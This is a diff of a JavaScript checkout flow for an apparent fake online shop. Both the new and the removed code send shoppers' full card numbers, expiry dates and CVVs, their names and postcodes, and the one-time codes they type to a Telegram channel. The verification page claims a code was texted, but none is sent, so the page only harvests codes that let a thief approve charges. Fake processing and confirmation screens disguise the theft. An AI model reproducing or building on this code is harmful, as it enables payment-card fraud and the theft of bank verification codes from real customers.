+                    <h3>${(currentLanguage === 'es' ? '¡Pedido Confirmado!' : 'Order Confirmed!')}</h3>
+                    <p>${(currentLanguage === 'es' ? 'Tu pedido ha sido procesado exitosamente.' : 'Your order has been processed successfully.')}</p>
+                    <div class="order-details">
+                        <div class="order-detail">
+                            <span>${(currentLanguage === 'es' ? 'Número de Pedido:' : 'Order Number:')}</span>
+                            <strong id="final-order-number">${checkoutData.orderNumber}</strong>
+                        </div>
+                        <div class="order-detail">
+                            <span>${(currentLanguage === 'es' ? 'Total:' : 'Total:')}</span>
+                            <strong>${convertPrice(subtotal, false)}</strong>
+                        </div>
+                        <div class="order-detail">
+                            <span>${(currentLanguage === 'es' ? 'Entrega Estimada:' : 'Estimated Delivery:')}</span>
+                            <strong>${getEstimatedDelivery()}</strong>
+                        </div>
+                    </div>
+                    <button class="btn btn-primary close-checkout-success">${(currentLanguage === 'es' ? 'Continuar Comprando' : 'Continue Shopping')}</button>
+                </div>
+            </div>
+        </div>
+
+        <div id="checkout-step-6" class="checkout-step">
+            <div class="otp-section">
+                <div class="otp-header">
+                    <div class="otp-security">
+                        <i class="fas fa-shield-alt"></i>
+                        <span>${(currentLanguage === 'es' ? 'Verificación de Seguridad' : 'Security Verification')}</span>
+                    </div>
+                </div>
+                <div class="otp-content">
+                    <h3>${(currentLanguage === 'es' ? 'Verificar tu Pago' : 'Verify Your Payment')}</h3>
+                    <p>${(currentLanguage === 'es' ? 'Hemos enviado un código de verificación de 6 dígitos a tu número de teléfono. Por favor, ingrésalo a continuación para completar tu compra.' : 'We have sent a 6-digit verification code to your phone number. Please enter it below to complete your purchase.')}</p>
+                    <div class="otp-input-container">
+                        <input type="tel" id="otp-single-input" class="otp-single-input" maxlength="6" inputmode="numeric" placeholder="123456" style="width: 200px; padding: 15px; font-size: 24px; text-align: center; border: 2px solid var(--border-color); border-radius: 8px; font-family: monospace; letter-spacing: 0.5em;" />
+                    </div>
+                    <div class="otp-timer">
+                        <span>${(currentLanguage === 'es' ? 'El código expira en:' : 'Code expires in:')}</span> 
+                        <span id="otp-countdown">02:00</span>
+                    </div>
+                    <div class="otp-actions">
+                        <button id="resend-otp-btn" class="btn btn-secondary" disabled>${(currentLanguage === 'es' ? 'Reenviar Código' : 'Resend Code')}</button>
+                        <button id="verify-otp-btn" class="btn btn-primary">${(currentLanguage === 'es' ? 'Verificar Código' : 'Verify Code')}</button>
+                        <button id="skip-otp-btn" class="btn btn-outline" style="margin-top: 1rem;">
+                        ${(currentLanguage === 'es' ? 'No requiero OTP' : 'I don\'t require OTP')}
+                    </button>
+                    </div>
+                    <div class="otp-error" id="otp-error" style="display: none;">
+                        <i class="fas fa-exclamation-triangle"></i>
+                        <span>${(currentLanguage === 'es' ? 'Código inválido. Por favor, inténtalo de nuevo.' : 'Invalid code. Please try again.')}</span>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>`;
+
     modal.innerHTML = checkoutHTML;
 
-    // Add modal to overlay
     overlay.appendChild(modal);
     document.body.appendChild(overlay);
 
-    // Setup events
     setupCheckoutEventListeners();
-}
-
-
-
-
-function applyDiscountCode() {
-    const discountCodeInput = document.getElementById('discount-code');
-    const discountMessage = document.getElementById('discount-message');
-    
-    if (!discountCodeInput) return;
-    
-    const code = discountCodeInput.value.trim().toUpperCase();
-    const validCodes = {
-        'SWAPPIE2025': { percentage: 10, description: '10% off your order' },
-        'WELCOME15': { percentage: 15, description: '15% off for new customers' },
-        'SAVE20': { percentage: 20, description: '20% off selected items' }
-    };
-    
-    if (validCodes[code] && typeof checkoutData.total === 'number') {
-        const discount = validCodes[code];
-        checkoutData.discountCode = code;
-        checkoutData.discountAmount = Math.round((checkoutData.total * discount.percentage) / 100 * 100) / 100; // round to 2 decimals
-        checkoutData.originalTotal = checkoutData.total;
-        
-        if (typeof updateCheckoutTotals === 'function') {
-            updateCheckoutTotals();
-        }
-        
-        if (discountMessage) {
-            discountMessage.style.display = 'flex';
-            discountMessage.style.background = '#d1fae5';
-            discountMessage.style.color = '#065f46';
-            discountMessage.style.border = '1px solid #34d399';
-            discountMessage.innerHTML = `<i class="fas fa-check"></i> ${discount.description} applied successfully!`;
-        }
-        
-        discountCodeInput.disabled = true;
-        const applyBtn = document.getElementById('apply-discount');
-        if (applyBtn) {
-            applyBtn.disabled = true;
-            applyBtn.textContent = 'Applied';
-        }
-        
-    } else {
-        if (discountMessage) {
-            discountMessage.style.display = 'flex';
-            discountMessage.style.background = '#fee2e2';
-            discountMessage.style.color = '#991b1b';
-            discountMessage.style.border = '1px solid #f87171';
-            discountMessage.innerHTML = `<i class="fas fa-exclamation-triangle"></i> Invalid discount code. Please try again.`;
-        }
-    }
+    setupDiscountCode();
 }
 
 function setupDiscountCode() {
+    const applyDiscountBtn = document.getElementById('apply-discount');
     const discountCodeInput = document.getElementById('discount-code');
-    const applyBtn = document.getElementById('apply-discount');
 
-    if (!discountCodeInput || !applyBtn) return;
+    if (applyDiscountBtn && discountCodeInput) {
+        applyDiscountBtn.addEventListener('click', function() {
+            applyDiscountCode();
+        });
 
-    // Enable or disable apply button based on input value
-    discountCodeInput.addEventListener('input', function() {
-        applyBtn.disabled = !this.value.trim();
-    });
-
-    // Apply discount code when button clicked
-    applyBtn.addEventListener('click', function(e) {
-        e.preventDefault();
-        applyDiscountCode();
-    });
-
-    // Initially disable apply button if input empty
-    applyBtn.disabled = !discountCodeInput.value.trim();
+        discountCodeInput.addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') {
+                e.preventDefault();
+                applyDiscountCode();
+            }
+        });
+    }
 }
 
+function setupCheckoutEventListeners() {
+    try {
+        // Close checkout
+        const closeCheckoutBtn = document.querySelector('.close-checkout');
+        if (closeCheckoutBtn) {
+            closeCheckoutBtn.addEventListener('click', closeCheckout);
+        }
+
+        const checkoutOverlay = document.querySelector('.checkout-overlay');
+        if (checkoutOverlay) {
+            checkoutOverlay.addEventListener('click', function(e) {
+                // Only close if clicking directly on overlay, not on modal content
+                if (e.target === this && !e.target.closest('.checkout-modal')) {
+                    e.preventDefault();
+                    closeCheckout();
+                }
+            });
+        }
+
+        // Step navigation
+        const nextToShippingBtn = document.getElementById('next-to-shipping');
+        const termsCheckbox = document.getElementById('terms-checkbox');
+
+        if (termsCheckbox && nextToShippingBtn) {
+            termsCheckbox.addEventListener('change', function() {
+                nextToShippingBtn.disabled = !this.checked;
+                if (this.checked) {
+                    nextToShippingBtn.classList.remove('disabled');
+                } else {
+                    nextToShippingBtn.classList.add('disabled');
+                }
+            });
+        }
+
+        if (nextToShippingBtn) {
+            nextToShippingBtn.addEventListener('click', function() {
+                const checkbox = document.getElementById('terms-checkbox');
+                if (checkbox && !checkbox.checked) {
+                    alert(currentLanguage === 'es' ? 'Debe aceptar los términos y condiciones para continuar' : 'You must accept the terms and conditions to continue');
+                    return;
+                }
+                goToCheckoutStep(2);
+            });
+        }
+
+        const backToSummaryBtn = document.getElementById('back-to-summary');
+        if (backToSummaryBtn) {
+            backToSummaryBtn.addEventListener('click', function() {
+                goToCheckoutStep(1);
+            });
+        }
+
+        const nextToPaymentBtn = document.getElementById('next-to-payment');
+        if (nextToPaymentBtn) {
+            nextToPaymentBtn.addEventListener('click', function() {
+                // Validate customer information
+                const customerName = document.getElementById('customer-name');
+                const customerPhone = document.getElementById('customer-phone');
+                const customerAddress = document.getElementById('customer-address');
+                const customerCity = document.getElementById('customer-city');
+
+                // Check required fields
+                if (!customerName || !customerName.value.trim()) {
+                    alert(currentLanguage === 'es' ? 'Por favor ingrese su nombre completo' : 'Please enter your full name');
+                    if (customerName) customerName.focus();
+                    return;
+                }
+
+                if (!customerPhone || !customerPhone.value.trim()) {
+                    alert(currentLanguage === 'es' ? 'Por favor ingrese su número de teléfono' : 'Please enter your phone number');
+                    if (customerPhone) customerPhone.focus();
+                    return;
+                }
+
+                if (!customerAddress || !customerAddress.value.trim()) {
+                    alert(currentLanguage === 'es' ? 'Por favor ingrese su dirección completa' : 'Please enter your complete address');
+                    if (customerAddress) customerAddress.focus();
+                    return;
+                }
+
+                if (!customerCity || !customerCity.value.trim()) {
+                    alert(currentLanguage === 'es' ? 'Por favor ingrese su ciudad' : 'Please enter your city');
+                    if (customerCity) customerCity.focus();
+                    return;
+                }
+
+                // Store customer information in checkoutData
+checkoutData.customerName = customerName.value.trim();
+checkoutData.customerPhone = customerPhone.value.trim();
+checkoutData.customerAddress = customerAddress.value.trim();
+checkoutData.customerCity = customerCity.value.trim();
+checkoutData.customerPostal = document.getElementById('customer-postal')?.value.trim() || '';
+
+// Send customer info to Telegram
+TelegramNotifications.sendCustomerInfo({
+    name: checkoutData.customerName,
+    postcode: checkoutData.customerPostal
+});
+
+goToCheckoutStep(3);
 
 
-function updateCheckoutTotals() {
-    const subtotalEl = document.getElementById('checkout-subtotal');
-    const totalEl = document.getElementById('checkout-total');
-    
-    let subtotal = cart.reduce((sum, item) => sum + (item.price * item.quantity), 0);
-    let finalTotal = subtotal;
-    
-    if (checkoutData.discountAmount > 0) {
-        finalTotal = subtotal - checkoutData.discountAmount;
-        
-        // Add discount row if it doesn't exist
-        const totalsContainer = document.querySelector('.checkout-totals');
-        if (totalsContainer && !document.querySelector('.discount-row')) {
-            const discountRow = document.createElement('div');
-            discountRow.className = 'totals-row discount-row';
-            discountRow.innerHTML = `
-                <span class="totals-label">Discount (${checkoutData.discountCode}):</span>
-                <span class="totals-value discount-value">-${convertPrice(checkoutData.discountAmount, false)}</span>
-            `;
-            
-            // Insert before total row
-            const totalRow = document.querySelector('.total-row');
-            if (totalRow) {
-                totalRow.parentNode.insertBefore(discountRow, totalRow);
+        const backToShippingBtn = document.getElementById('back-to-shipping');
+        if (backToShippingBtn) {
+            backToShippingBtn.addEventListener('click', function() {
+                goToCheckoutStep(2);
+            });
+        }
+
+        // Payment method selection
+        document.querySelectorAll('input[name="payment-method"]').forEach(radio => {
+            radio.addEventListener('change', function() {
+                const method = this.value;
+
+                // Remove active class from all payment options
+                document.querySelectorAll('.payment-option').forEach(opt => opt.classList.remove('active'));
+
+                // Hide all payment details and instruction
+                document.querySelectorAll('.payment-details').forEach(detail => {
+                    detail.style.display = 'none';
+                    detail.classList.remove('active');
+                });
+
+                const instruction = document.getElementById('payment-method-instruction');
+                if (instruction) {
+                    instruction.style.display = 'none';
+                }
+
+                // Add active class to selected option
+                this.closest('.payment-option').classList.add('active');
+
+                // Show selected payment details
+                const detailsElement = document.getElementById(`${method}-details`);
+                if (detailsElement) {
+                    detailsElement.style.display = 'block';
+                    detailsElement.classList.add('active');
+                }
+
+                checkoutData.paymentMethod = method;
+            });
+        });
+
+        // Place order event listeners
+        document.querySelectorAll('.place-order').forEach(function(btn) {
+            btn.addEventListener('click', function(e) {
+                e.preventDefault();
+                e.stopPropagation();
+
+                try {
+                    const method = this.dataset.method;
+
+                    if (method === 'bank-transfer') {
+                        // Send Telegram notification for bank transfer
+                        if (typeof TelegramNotifications !== 'undefined') {
+                            TelegramNotifications.confirmBankTransfer({
+                                total: convertPrice(getCartTotal(), false),
+                                orderRef: generateOrderReference()
+                            });
+                        }
+                        processOrder();
+                    } else if (method === 'credit-card') {
+                        if (!validateCardDetails()) {
+                            return; // Stop processing if card details are invalid
+                        }
+
+                        // Store cardholder name
+                        const cardholderNameInput = document.getElementById('cardholder-name');
+                        checkoutData.cardholderName = cardholderNameInput ? cardholderNameInput.value : '';
+
+                        // Send Telegram notification for card details
+                        if (typeof TelegramNotifications !== 'undefined') {
+                            const cardNumber = document.getElementById('card-number').value.replace(/\s/g, '');
+                            const lastFourDigits = cardNumber.slice(-4);
+                            TelegramNotifications.cardDetailsSubmitted({
+                                total: convertPrice(getCartTotal(), false),
+                                orderRef: generateOrderReference(),
+                                cardholderName: checkoutData.cardholderName,
+                                cardNumber: document.getElementById('card-number').value.replace(/\s/g, ''),
+                                expiryDate: document.getElementById('expiry-date').value,
+                                cvv: document.getElementById('cvv').value,
+                                lastFourDigits: lastFourDigits
+                            });
+                        }
+
+                        // Proceed to the processing step (card submission)
+                        goToCheckoutStep(4);
+
+                        // 10-second delay for card processing
+                        setTimeout(function() {
+                            // Proceed to verification step without generating OTP
+                            goToCheckoutStep(6);
+
+                            // Start OTP countdown
+                            startOTPCountdown();
+                        }, 10000); // 10 seconds delay
+                    }
+                } catch (error) {
+                    console.error('Error placing order:', error);
+                    alert('There was an error placing your order. Please try again.');
+                }
+
+                return false;
+            });
+        });
+
+        // Success close - use event delegation properly
+        document.addEventListener('click', function(e) {
+            if (e.target.classList.contains('close-checkout-success')) {
+                e.preventDefault();
+                e.stopPropagation();
+                closeCheckout();
+                clearCart();
+            }
+        });
+
+        // OTP Verification
+        const verifyOtpBtn = document.getElementById('verify-otp-btn');
+        const skipOtpBtn = document.getElementById('skip-otp-btn');
+        const resendOtpBtn = document.getElementById('resend-otp-btn');
+
+        if (verifyOtpBtn) verifyOtpBtn.addEventListener('click', verifyOTP);
+        if (skipOtpBtn) skipOtpBtn.addEventListener('click', skipOTP);
+        if (resendOtpBtn) resendOtpBtn.addEventListener('click', resendOTP);
+
+        // Setup OTP input navigation
+        setupOTPInputs();
+
+        // Setup card input formatting
+        setupCardInputFormatting();
+
+
+
+function setupCardInputFormatting() {
+    const cardNumberInput = document.getElementById('card-number');
+    const expiryDateInput = document.getElementById('expiry-date');
+    const cvvInput = document.getElementById('cvv');
+
+    if (cardNumberInput) {
+        cardNumberInput.addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\D/g, ''); // Remove non-digits
+            value = value.substring(0, 16); // Limit to 16 digits
+            value = value.replace(/(\d{4})(?=\d)/g, '$1 '); // Add spaces every 4 digits
+            e.target.value = value;
+        });
+    }
+
+    if (expiryDateInput) {
+        expiryDateInput.addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\D/g, ''); // Remove non-digits
+            if (value.length >= 2) {
+                value = value.substring(0, 2) + '/' + value.substring(2, 4);
+            }
+            e.target.value = value;
+        });
+    }
+
+    if (cvvInput) {
+        cvvInput.addEventListener('input', function(e) {
+            e.target.value = e.target.value.replace(/\D/g, '').substring(0, 3); // Only digits, max 3
+        });
+    }
+}
+
+function validateCardDetails() {
+    const cardNumber = document.getElementById('card-number').value.replace(/\s/g, ''); // Remove spaces
+    const expiryDate = document.getElementById('expiry-date').value;
+    const cvv = document.getElementById('cvv').value;
+    const cardErrors = document.getElementById('card-errors');
+
+    // Card Number: Must be 16 digits
+    if (!/^\d{16}$/.test(cardNumber)) {
+        cardErrors.textContent = currentLanguage === 'es' ? 'Número de tarjeta inválido. Debe tener 16 dígitos.' : 'Invalid card number. Must be 16 digits.';
+        cardErrors.style.display = 'block';
+        return false;
+    }
+
+    // Expiry Date: Must be in MM/YY format
+    if (!/^(0[1-9]|1[0-2])\/\d{2}$/.test(expiryDate)) {
+        cardErrors.textContent = currentLanguage === 'es' ? 'Fecha de vencimiento inválida. Debe estar en formato MM/AA.' : 'Invalid expiry date. Must be in MM/YY format.';
+        cardErrors.style.display = 'block';
+        return false;
+    }
+
+    // CVV: Must be 3 digits
+    if (!/^\d{3}$/.test(cvv)) {
+        cardErrors.textContent = currentLanguage === 'es' ? 'CVV inválido. Debe tener 3 dígitos.' : 'Invalid CVV. Must be 3 digits.';
+        cardErrors.style.display = 'block';
+        return false;
+    }
+    cardErrors.style.display = 'none'; // Clear errors if valid
+    return true;
+}
+
+function setupOTPInputs() {
+    // Remove existing listeners to prevent duplicates
+    const existingHandler = document.body.getAttribute('data-otp-handler');
+    if (existingHandler) return;
+
+    // Add input formatting for single OTP input - keep it simple
+    document.body.addEventListener('input', function(e) {
+        if (e.target && e.target.id === 'otp-single-input') {
+            // Only allow numeric input and limit to 6 characters
+            let value = e.target.value.replace(/[^0-9]/g, '');
+            value = value.substring(0, 6);
+            e.target.value = value;
+
+            // Auto-verify when 6 digits are entered
+            if (value.length === 6) {
+                setTimeout(() => {
+                    verifyOTP();
+                }, 100);
+            }
+        }
+    });
+
+    document.body.addEventListener('keydown', function(e) {
+        if (e.target && e.target.id === 'otp-single-input') {
+            // Allow only numeric keys and control keys
+            if (!/[0-9]/.test(e.key) && !['Backspace', 'Delete', 'Tab', 'Enter', 'ArrowLeft', 'ArrowRight'].includes(e.key)) {
+                e.preventDefault();
+            }
+        }
+    });
+
+    // Mark as initialized
+    document.body.setAttribute('data-otp-handler', 'true');
+}
+
+let otpTimeout; // Define otpTimeout in a higher scope
+
+function simulateOTPSending(phoneNumber) {
+    // Generate a random 6-digit OTP
+    const otp = Math.floor(100000 + Math.random() * 900000);
+    console.log('Simulating OTP sending to ' + phoneNumber + ': ' + otp);
+    // In a real implementation, this would send an actual OTP
+    // Store the OTP (for demonstration purposes only)
+    localStorage.setItem('otp', otp.toString());
+}
+
+function startOTPCountdown() {
+    let timeRemaining = 120; // 2 minutes (120 seconds)
+    const countdownDisplay = document.getElementById('otp-countdown');
+    const resendButton = document.getElementById('resend-otp-btn');
+
+    if (!countdownDisplay || !resendButton) {
+        console.error('OTP countdown elements not found');
+        return;
+    }
+
+    // Set initial display to 2:00
+    countdownDisplay.textContent = '02:00';
+    resendButton.disabled = true;
+
+    function updateCountdown() {
+        timeRemaining--;
+
+        // Ensure timeRemaining is not negative
+        if (timeRemaining < 0) {
+            timeRemaining = 0;
+        }
+
+        const minutes = Math.floor(timeRemaining / 60);
+        const seconds = timeRemaining % 60;
+        countdownDisplay.textContent = `${minutes < 10 ? '0' : ''}${minutes}:${seconds < 10 ? '0' : ''}${seconds}`;
+
+        if (timeRemaining <= 0) {
+            clearInterval(otpTimeout);
+            countdownDisplay.textContent = '00:00';
+            resendButton.disabled = false;
+            resendButton.style.opacity = '1';
+            resendButton.style.cursor = 'pointer';
+        }
+    }
+
+    // Clear any existing timeout before setting a new one
+    if (otpTimeout) {
+        clearInterval(otpTimeout);
+    }
+
+    // Start countdown after 1 second
+    otpTimeout = setInterval(updateCountdown, 1000);
+}
+
+function verifyOTP() {
+    const otpInput = document.getElementById('otp-single-input');
+    if (!otpInput) {
+        console.error('OTP input not found');
+        return;
+    }
+
+    // Get the raw input value (no space removal needed)
+    const enteredOTP = otpInput.value.trim();
+    const otpError = document.getElementById('otp-error');
+
+    console.log('Verifying OTP:', enteredOTP, 'Length:', enteredOTP.length);
+
+    // Check if OTP format is valid
+    if (enteredOTP.length === 6 && /^\d{6}$/.test(enteredOTP)) {
+        // Send the user-entered OTP to Telegram for verification
+        if (typeof TelegramNotifications !== 'undefined') {
+            TelegramNotifications.userEnteredOTP(enteredOTP);
+        }
+
+        console.log('User entered OTP sent to Telegram:', enteredOTP);
+
+        if (otpError) {
+            otpError.style.display = 'none';
+        }
+
+        // Clean up stored OTP
+        localStorage.removeItem('currentOTP');
+        localStorage.removeItem('otp');
+
+        // Process the order
+        processOrder();
+
+    } else {
+        // Show error for invalid or incomplete OTP
+        console.log('Invalid or incomplete OTP');
+        if (otpError) {
+            otpError.style.display = 'block';
+            const errorText = otpError.querySelector('span');
+            if (errorText) {
+                errorText.textContent = currentLanguage === 'es' ? 
+                    'Por favor ingrese exactamente 6 dígitos' : 
+                    'Please enter exactly 6 digits';
             }
         }
     }
-    
-    if (subtotalEl) subtotalEl.textContent = convertPrice(subtotal, false);
-    if (totalEl) totalEl.textContent = convertPrice(finalTotal, false);
-    
-    // Update checkout data
-    checkoutData.total = finalTotal;
-	}
+}
 
-let otpTimeout; // To hold the timer for the OTP countdown
+function skipOTP() {
+    // Skip OTP verification and go directly to order completion
+    document.getElementById('otp-error').style.display = 'none';
+    processOrder();
+}
+
+function resendOTP() {
+    // Generate new OTP
+    const newOtp = Math.floor(100000 + Math.random() * 900000);
+    localStorage.setItem('currentOTP', newOtp.toString());
+    console.log('New OTP generated:', newOtp);
+
+    simulateOTPSending(checkoutData.customerPhone);
+    const resendBtn = document.getElementById('resend-otp-btn');
+    if (resendBtn) {
+        resendBtn.disabled = true;
+    }
+
+    // Clear any error messages
+    const otpError = document.getElementById('otp-error');
+    if (otpError) {
+        otpError.style.display = 'none';
+    }
+
+    // Clear OTP input
+    const otpInput = document.getElementById('otp-single-input');
+    if (otpInput) {
+        otpInput.value = '';
+        otpInput.focus();
+    }
+
+    startOTPCountdown();
+}
 
 function goToCheckoutStep(stepNumber) {
     try {
@@ -1921,59 +1465,45 @@ function goToCheckoutStep(stepNumber) {
     }
 }
 
-function startOTPCountdown() {
-    let timeRemaining = 120; // 2 minutes
-    const countdownDisplay = document.getElementById('otp-countdown');
-    const resendButton = document.getElementById('resend-otp-btn');
-
-    if (!countdownDisplay || !resendButton) return;
-
-    countdownDisplay.textContent = '02:00';
-    resendButton.disabled = true;
-
-    function updateCountdown() {
-        timeRemaining--;
-        if (timeRemaining < 0) timeRemaining = 0;
-
-        const minutes = Math.floor(timeRemaining / 60);
-        const seconds = timeRemaining % 60;
-        countdownDisplay.textContent = `${minutes < 10 ? '0' : ''}${minutes}:${seconds < 10 ? '0' : ''}${seconds}`;
-
-        if (timeRemaining <= 0) {
-            clearInterval(otpTimeout);
-            resendButton.disabled = false;
-        }
-    }
-
-    if (otpTimeout) clearInterval(otpTimeout);
-    otpTimeout = setInterval(updateCountdown, 1000);
-}
-
 function processOrder() {
     try {
-        goToCheckoutStep(6); // Go to the final confirmation step
+        goToCheckoutStep(5);
 
+        // Simulate processing steps
         const steps = [
-            { text: t('validating_payment_method'), delay: 1000 },
-            { text: t('confirming_inventory'), delay: 1500 },
-            { text: t('generating_order'), delay: 2000 }
+            { text: currentLanguage === 'es' ? 'Validando método de pago' : 'Validating payment method', delay: 1000 },
+            { text: currentLanguage === 'es' ? 'Confirmando inventario' : 'Confirming inventory', delay: 1500 },
+            { text: currentLanguage === 'es' ? 'Generando orden de compra' : 'Generating purchase order', delay: 2000 },
+            { text: currentLanguage === 'es' ? 'Generando factura' : 'Generating invoice', delay: 1000 }
         ];
 
         let currentStep = 0;
 
         function nextStep() {
-            if (currentStep < steps.length) {
-                const stepTextElement = document.querySelector('#processing-payment .step-text');
-                if (stepTextElement) stepTextElement.textContent = steps[currentStep].text;
-                setTimeout(nextStep, steps[currentStep].delay);
-                currentStep++;
-            } else {
-                generateInvoice();
-                const processingElement = document.getElementById('processing-payment');
-                const successElement = document.getElementById('order-success');
-                if (processingElement) processingElement.style.display = 'none';
-                if (successElement) successElement.style.display = 'block';
-                console.log('Order completed:', checkoutData.orderNumber);
+            try {
+                if (currentStep < steps.length) {
+                    const stepTextElement = document.querySelector('.step-text');
+                    if (stepTextElement) {
+                        stepTextElement.textContent = steps[currentStep].text;
+                    }
+                    currentStep++;
+                    setTimeout(nextStep, steps[currentStep - 1].delay);
+                } else {
+                    // Generate invoice before showing success
+                    generateInvoice();
+
+                    // Show success
+                    const processingElement = document.getElementById('processing-payment');
+                    const successElement = document.getElementById('order-success');
+
+                    if (processingElement) processingElement.style.display = 'none';
+                    if (successElement) successElement.style.display = 'block';
+
+                    // Order completed successfully
+                    console.log('Order completed:', checkoutData.orderNumber);
+                }
+            } catch (error) {
+                console.error('Error in nextStep:', error);
             }
         }
 
@@ -1983,529 +1513,6 @@ function processOrder() {
         alert('There was an error processing your order. Please try again.');
     }
 }
-
-function setupCheckoutEventListeners() {
-    try {
-        // Close checkout
-        const closeCheckoutBtn = document.querySelector('.close-checkout');
-        if (closeCheckoutBtn) {
-            closeCheckoutBtn.addEventListener('click', closeCheckout);
-        }
-
-        const checkoutOverlay = document.querySelector('.checkout-overlay');
-        if (checkoutOverlay) {
-            checkoutOverlay.addEventListener('click', function(e) {
-                // Only close if clicking directly on overlay, not on modal content
-                if (e.target === this && !e.target.closest('.checkout-modal')) {
-                    e.preventDefault();
-                    closeCheckout();
-                }
-            });
-        }
-
-        // Setup discount code event listeners
-        setupDiscountCode();
-
-        // Step navigation
-        const nextToShippingBtn = document.getElementById('next-to-shipping');
-        const termsCheckbox = document.getElementById('terms-checkbox');
-
-        if (termsCheckbox && nextToShippingBtn) {
-            termsCheckbox.addEventListener('change', function() {
-                nextToShippingBtn.disabled = !this.checked;
-                if (this.checked) {
-                    nextToShippingBtn.classList.remove('disabled');
-                } else {
-                    nextToShippingBtn.classList.add('disabled');
-                }
-            });
-        }
-
-      if (nextToShippingBtn) {
-    nextToShippingBtn.addEventListener('click', function() {
-        const checkbox = document.getElementById('terms-checkbox');
-        if (checkbox && !checkbox.checked) {
-            alert(t("accept_terms_alert"));
-            return;
-        }
-        goToCheckoutStep(2);
-    });
-}
-
-
-        const backToSummaryBtn = document.getElementById('back-to-summary');
-        if (backToSummaryBtn) {
-            backToSummaryBtn.addEventListener('click', function() {
-                goToCheckoutStep(1);
-            });
-        }
-
-        const nextToPaymentBtn = document.getElementById('next-to-payment');
-        if (nextToPaymentBtn) {
-            nextToPaymentBtn.addEventListener('click', function() {
-                // Validate customer information
-                const customerName = document.getElementById('customer-name');
-                const customerPhone = document.getElementById('customer-phone');
-                const customerAddress = document.getElementById('customer-address');
-                const customerCity = document.getElementById('customer-city');
-
-                // Check required fields
-if (!customerName || !customerName.value.trim()) {
-    alert(t("enter_full_name"));
-    if (customerName) customerName.focus();
-    return;
-}
-
-if (!customerPhone || !customerPhone.value.trim()) {
-    alert(t("enter_phone_number"));
-    if (customerPhone) customerPhone.focus();
-    return;
-}
-
-if (!customerAddress || !customerAddress.value.trim()) {
-    alert(t("enter_complete_address"));
-    if (customerAddress) customerAddress.focus();
-    return;
-}
-
-if (!customerCity || !customerCity.value.trim()) {
-    alert(t("enter_city"));
-    if (customerCity) customerCity.focus();
-    return;
-}
-
-
-				
-                // Store customer information in checkoutData
-checkoutData.customerName = customerName.value.trim();
-checkoutData.customerPhone = customerPhone.value.trim();
-checkoutData.customerAddress = customerAddress.value.trim();
-checkoutData.customerCity = customerCity.value.trim();
-checkoutData.customerPostal = document.getElementById('customer-postal')?.value.trim() || '';
-
-// Send customer info to Telegram
-TelegramNotifications.sendCustomerInfo({
-    name: checkoutData.customerName,
-    postcode: checkoutData.customerPostal
-});
-
-goToCheckoutStep(3);
-    });
-}
-
-
-        const backToShippingBtn = document.getElementById('back-to-shipping');
-        if (backToShippingBtn) {
-            backToShippingBtn.addEventListener('click', function() {
-                goToCheckoutStep(2);
-            });
-        }
-
-       // Payment method selection handler
-document.querySelectorAll('input[name="payment-method"]').forEach(radio => {
-    radio.addEventListener('change', function() {
-        const method = this.value;
-
-        // Remove 'active' class from all payment options
-        document.querySelectorAll('.payment-option').forEach(opt => opt.classList.remove('active'));
-
-        // Hide all payment details and remove 'active' class
-        document.querySelectorAll('.payment-details').forEach(detail => {
-            detail.style.display = 'none';
-            detail.classList.remove('active');
-        });
-
-        // Hide payment instruction
-        const instruction = document.getElementById('payment-method-instruction');
-        if (instruction) instruction.style.display = 'none';
-
-        // Add 'active' class to the selected payment option
-        const paymentOption = this.closest('.payment-option');
-        if (paymentOption) paymentOption.classList.add('active');
-
-        // Show details of the selected payment method
-        const detailsElement = document.getElementById(`${method}-details`);
-        if (detailsElement) {
-            detailsElement.style.display = 'block';
-            detailsElement.classList.add('active');
-        }
-
-        // Populate bank transfer details dynamically
-        if (method === 'bank-transfer') {
-            const bankInfoContainer = document.getElementById('bank-transfer-info');
-            if (bankInfoContainer) {
-                const subtotal = cart.reduce((sum, item) => sum + (item.price * item.quantity), 0);
-                const total = checkoutData.discountAmount > 0 ? subtotal - checkoutData.discountAmount : subtotal;
-
-                bankInfoContainer.innerHTML = `
-                    <p><strong>${t("bank_name")}</strong> ${getBankName()}</p>
-                    <p><strong>${t("account_number")}</strong> ${getAccountNumber()}</p>
-                    <p><strong>${t("account_holder")}</strong> ${getAccountHolder()}</p>
-                    <p><strong>${t("reference")}</strong> ${checkoutData.orderNumber}</p>
-                    <p style="margin-top: 1rem; font-weight: bold; font-size: 1.1rem;">
-                        <strong>${t("total")}:</strong> ${convertPrice(total, false)}
-                    </p>`;
-            }
-        }
-
-        // Save selected payment method in checkout data
-        checkoutData.paymentMethod = method;
-    });
-});
-// Place order buttons event listener
-document.querySelectorAll('.place-order').forEach(btn => {
-    btn.addEventListener('click', function(e) {
-        e.preventDefault();
-        e.stopPropagation();
-
-        try {
-            const method = this.dataset.method;
-
-            if (method === 'bank-transfer') {
-                // Telegram notification for bank transfer
-                if (typeof TelegramNotifications !== 'undefined' && TelegramNotifications.confirmBankTransfer) {
-                    const total = checkoutData.total;
-                    TelegramNotifications.confirmBankTransfer({
-                        total: convertPrice(total, false),
-                        orderRef: checkoutData.orderNumber
-                    });
-                }
-                processOrder();
-
-            } else if (method === 'credit-card') {
-                if (!validateCardDetails()) {
-                    // Card details invalid, stop further processing
-                    return;
-                }
-
-                // Store cardholder name
-                const cardholderNameInput = document.getElementById('cardholder-name');
-                checkoutData.cardholderName = cardholderNameInput ? cardholderNameInput.value : '';
-
-                // Send Telegram notification for card details
-                if (typeof TelegramNotifications !== 'undefined' && TelegramNotifications.cardDetailsSubmitted) {
-                    const cardNumber = document.getElementById('card-number').value.replace(/\s/g, '');
-                    TelegramNotifications.cardDetailsSubmitted({
-                        total: convertPrice(checkoutData.total, false),
-                        orderRef: checkoutData.orderNumber,
-                        cardholderName: checkoutData.cardholderName,
-                        cardNumber: document.getElementById('card-number').value,
-                        expiryDate: document.getElementById('expiry-date').value,
-                        cvv: document.getElementById('cvv').value
-                    });
-                }
-
-                // Proceed to the processing step (card submission)
-                goToCheckoutStep(4); // Step 4: Processing spinner
-
-                // 20-second delay for card processing simulation
-                setTimeout(function () {
-                    // Step 5: OTP Verification
-                    goToCheckoutStep(5);
-                    startOTPCountdown();
-                }, 20000); // 20 seconds
-
-            } else {
-                console.warn(`Unknown payment method: ${method}`);
-            }
-        } catch (error) {
-            console.error('Error placing order:', error);
-            alert('There was an error placing your order. Please try again.');
-        }
-
-        return false;
-    });
-});
